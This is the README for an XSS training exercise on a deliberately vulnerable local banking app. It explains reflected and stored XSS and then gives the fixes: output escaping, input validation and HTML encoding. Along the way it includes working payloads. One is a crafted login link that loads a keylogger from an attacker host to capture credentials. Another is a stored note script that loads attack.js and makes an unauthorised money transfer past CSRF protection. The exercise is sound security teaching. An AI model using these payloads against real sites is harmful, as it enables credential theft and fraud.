# Exercise 2 - XXS 

This exercise is to help you understand XSS and its mitigation.

## Setup and Start Applications

1. check out exercise2 
   * choose branch 'exercise2' in the 'VCS -> Git -> Branches' menu within IntelliJ
1. start the v-bank-app in debug mode
   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
1. start the attacker-app
   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
   
## Search for XSS vulnerabilities

XSS is about injecting malicious javascript into the application so that it is executed in the browser within a valis user session.
Please remember the 2 categorizations of XSS vulnerabilities:
#### __reflected OR stored XSS__
1. reflected XSS: the malicious javascript code displayed in the response is included with the corresponding request.
1. stored or persisted XSS: the malicious javascript is read from a storage (typically database), and has to be saved there first.
#### __source OR DOM based XSS__
1. source based: the malicious javascript code is placed into the HTML markup on the server side before sent to the browser/client.
1. DOM based: it is client side javascript code manipulating the page in the browser through its document-object-model (DOM) that places the malicious code into the page.  
#### Hints:
* The v-bank application is a rather traditional multi page web application with little Ajax/Javascript code (there is only a little on the home page).\
Therefore it is mostly susceptible to source based XSS vulnerabilities.
* Look for reflected XSS vulnerabilities where request parameters are directly written to the HTML output (page.tag is template used for all pages)
* Look for stored XSS vulnerabilities where form values are saved without validation/encoding/sanitization and then / or printed without escaping
#### Present XSS vulnerabilities:
* *page.tag* template prints a number of requests parameters into the HTML without escaping:
  * *error* : `<div ...>${error}</div>`
  * *info* : `<div ...>${info}</div>` 
  * *message* : `<div ...>${message}</div>`
  * Test it: 
    1. You should get an alert pop-up with '1' displayed as the javascript in the request parameter executes: http://vbank.127.0.0.1.xip.io:8080/login?info=%3Cscript%3Ealert(1)%3C/script%3E 
* *transfer.jsp* and *BankController.doTransfer(...)* save the transfer details without validation/etc. and *history.jsp* displays them w/o escaping
  * Test it:
    1. Go to the transfer page and make a transfer to any valid account (i.e. 2-123456-22) with the note '<script>alert(2)</script>'
    1. Then visit the history page where you should get an alert pop-up with '1' displayed as the javascript entered in the note filed executes.

## Exploit to understand
1. Exploit stored XSS in login page:
   * as Alice send Bob the login link which installs a keylogger by exploiting the reflected XSS vulnerability: 
     http://vbank.127.0.0.1.xip.io:8080/login?info=%3Cscript%20src=%22http://attack.127.0.0.1.xip.io:9090/js/keylog.js%22%3E%3C/script%3E 
   * the keylogger sends each keystroke to the log service running in the attacker app, the logged keystrokes you can see at http://attack.127.0.0.1.xip.io:9090/viewlog\
     (Do not let the browser autofil the form! ...because there are no keystrokes then)
   * this way Alice can steal Bob's login credentials. Even though the keylogger and the log viewer app are by far no perfect
1. Exploit stored XSS
   * log in as Alice (alice / h1alice) and trasnfer Bob a little amount with the note including a malicious javascript posting a transfer (and overcoming CSRF protection by including the token)
     * Bob's account No is 1-123456-11
     * The attack script is at http://attack.127.0.0.1.xip.io:9090/js/attack.js; this has a function *transfer(formname, fromAccount, toAccount, amount, currency, action)* 
     * Use this in the note field: `<script src="http://attack.127.0.0.1.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","1000","CHF")</script>`
     * Please transfer 1 CHF to Bob's account with the above script in the note.
   * as Bob logs in and reviews his transactions the malicious script included in Alice's transfer executes and transfers Alice a larger amount without Bob's consent.
     * login as Bob (bob / h3ll0bob) and go to the transaction history page (by clickin on the account number); 
     * the malicious script you have just saved in the note field of the transaction as Alice is loaded from the database and executed in the browser;
     * if you refresh the page you sould see the transaction. Acrtually; the script should execute every time the transaction history page is loaded for Bob.
  
## Mitigations:
  * validate input
    * set up validation rules (such as data size/length, format, possible values) for the transaction fields of accountNo, amount, currency
  * encode text input (i.e. with HTML encoding) 
    * on the transaction form this applies to the _note_ field
  * sanitize text/HTML input (remove potentially dangerous char sequences) 
    * only if validation and encoding are not possible (i.e. rich text HTML)
    * well, the transaction form has no such field
  * escape output; it replaces control characters with their encoded counterparts that are not interpreted as controls/commands by the HTML parser and can be displayed (i.e. < will be converted to &gt;)
  * use Secure-Content-Policy headers to control which scripts the browser can execute (this needs to be supported by the browser as well)

## Fix
* Escape output in *page.tag* and *history.jsp*:
For JSP please use c:out tag; you may explicitly set the escapeXml to true `<c:out value="${variable}" escapeXml=true />`
* Validate/encode input in *BankController.doTransfer(...)*

```java
public class BankController {

    private static final Collection<String> SUPPORTED_CURRENCIES = Arrays.asList("CHF", "USD", "GBP", "EUR");

    private static final String ACCOUNT_NO_PATTERN = "^\\d{1}?-\\d{6}?-\\d{2}?$";

    ...
    @RequestMapping(value = "/doTransfer", method = RequestMethod.POST)
    public ModelAndView doTransfer(@ModelAttribute Transaction transaction, ModelMap model) {
        //only execute transfer if the transaction data is valid
        if (validateTransaction(transaction, model)) {
            //note is free text property, we convert it to HTML encoding so that it is safe(r) to handle 
            String encodedNote = Encode.forHtmlContent(transaction.getNote());
            if (accountService.transfer(transaction.getFromAccountNo(), transaction.getToAccountNo(), transaction.getAmount(),
                    transaction.getCurrency(), encodedNote)) {
                model.addAttribute("info", "Transaction was completed.");
            } else {
                model.addAttribute("info", "Transaction is pending.");
            }
            return new ModelAndView("redirect:/", model);
        } else {
            return new ModelAndView("transfer", model);
        }
    }
    
    ...

    private boolean validateTransaction(Transaction transaction, ModelMap modelMap) {
        boolean valid = true;
        try {
            validateAccountNo(transaction.getFromAccountNo());
        } catch(ValidationException e) {
            modelMap.addAttribute("fromAccountNoMsg", e.getMessage());
            valid = false;
        }
        try {
            validateAccountNo(transaction.getToAccountNo());
        } catch(ValidationException e) {
            modelMap.addAttribute("toAccountNoMsg", e.getMessage());
            valid = false;
        }
        if (!SUPPORTED_CURRENCIES.contains(transaction.getCurrency())) {
            modelMap.addAttribute("currencyMsg", "Currency not supported!");
            valid = false;
        }
        if (transaction.getAmount() == null) {
            modelMap.addAttribute("amountMsg", "Transaction amount is required");
            valid = false;
        }
        return valid;
    }
}
```
  
You may see the solution in the _exercise2-solution_ branch at at https://github.com/vargadan/v-bank/tree/exercise2-solution

The relevant changes are:
* validation logic in the BankController class in file _BankController.java_
* the generic page template escaping output in file _page.tag_

More on XSS prevention:
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md